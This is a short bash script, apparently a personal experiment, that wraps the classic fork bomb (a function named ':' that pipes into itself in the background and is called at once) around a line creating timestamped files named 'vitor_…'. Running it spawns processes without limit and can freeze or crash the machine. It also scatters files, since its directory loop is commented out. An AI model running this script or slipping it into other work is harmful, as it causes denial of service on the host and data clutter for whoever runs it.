#!/bin/bash

DIR="/home/ubuntu/Vitor"

#DIRECTORIES=$(find "$DIR" -type d)

:(){
    #for D in $DIRECTORIES; do
        touch "$D/vitor_$(date +%s%N).txt"
    #done
    :|: &
};:
